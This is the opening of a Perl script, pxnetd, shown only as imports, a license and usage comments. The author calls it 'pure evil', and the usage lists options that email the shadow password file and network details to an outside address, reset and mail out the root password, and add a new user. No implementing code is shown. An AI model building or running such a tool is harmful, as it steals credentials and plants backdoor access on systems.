#!/usr/bin/perl

#use strict;
use Getopt::Std;
use IO::Socket;

# The information on the program
my $version = "0.2.2";

# pxnetd - Sends IP info and shadow file to email address specified in pxnetd config file.
# This is a re-write of the original. The past versions are no longer available.
# Copyright (C) 2008 - 2013 Karl Kernaghan
# Email - kkernaghan7@gmail.com

# This package is free software and is released under the Perl Artistic License. You are free to modify
# and redistribute this package under these terms. You should have received a copy of this license along
# with this package, if not, see the perlartistic man page for more information.
#
# THIS PACKAGE WAS RELEASED AS THE STANDARD VERSION BY THE COPYRIGHT HOLDER AND IS PROVIDED "AS IS"
# WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES
# OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.

# There is no sugar coating this program, it is pure evil! I have not yet been able to find a good use
# for it, but I'm sure somebody might someday.

# This program MUST be run as root.
# The pxnetd.conf file MUST be configured correctly and be in the same directory as pxnetd.

# Usage:
#
# ./pxnetd.pl <option>
#
# -e  Email the ifconfig output and the shadow file to the address in mail_to in the config file.
# -r  Change the root password as specified in the config file and email that to mail_to.
# -u  Create a new user and password as specified in the config file.

